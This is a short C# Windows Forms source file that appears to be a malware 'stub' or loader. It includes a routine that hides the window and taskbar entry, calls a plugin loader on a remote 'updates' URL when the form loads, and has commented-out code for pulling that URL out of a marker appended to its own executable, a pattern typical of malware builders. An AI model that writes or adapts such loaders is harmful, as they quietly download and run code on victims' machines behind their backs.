using Plugin.Core;
using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
// Antidote was here. :)
namespace Hstub
{
    public partial class Form1 : Form
    {
        public Form1()
        {

            InitializeComponent();
        }
        public void Hidden()
        {
            this.Visible = true;
            this.ShowInTaskbar = false;
            this.ShowIcon = false;
            this.Width = 1;
            this.Height = 1;
            this.Hide();
        }
 
        private void Form1_Load(object sender, EventArgs e)
        {
            //StreamReader sr = new StreamReader(Environment.CurrentDirectory + "//" + System.AppDomain.CurrentDomain.FriendlyName);
            //string get_data = sr.ReadToEnd();
            //sr.Close();
            //get_data = get_data.Substring(get_data.IndexOf("#URL#"), get_data.IndexOf("#ENDURL#") - get_data.IndexOf("#URL#")).Replace("#URL#", "");
             PluginLoader.GetPlugins("http://localhost/ax0n/updates.txt");
            //Hidden()
        }
    }
}
